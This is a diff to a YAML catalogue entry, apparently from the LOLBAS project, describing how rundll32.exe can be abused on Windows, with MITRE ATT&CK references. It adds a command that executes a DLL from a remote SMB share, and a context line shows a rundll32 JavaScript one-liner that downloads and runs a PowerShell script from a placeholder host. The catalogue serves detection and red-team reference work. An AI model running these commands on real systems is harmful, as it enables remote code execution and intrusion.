@@ -12,6 +12,14 @@ Commands:
     MitreID: T1085
     MitreLink: https://attack.mitre.org/wiki/Technique/T1085
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+  - Command: rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
+    Description: Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.
+    Usecase: Execute DLL from SMB share.
+    Category: Execute
+    Privileges: User
+    MitreID: T1085
+    MitreLink: https://attack.mitre.org/techniques/T1085
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
     Description: Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.
     Usecase: Execute code from Internet
@@ -84,4 +92,6 @@ Acknowledgement:
     Handle: '@bohops'
   - Person: Sailay
     Handle: '@404death'
+  - Person: Martin Ingesen
+    Handle: '@Mrtn9'
 ---
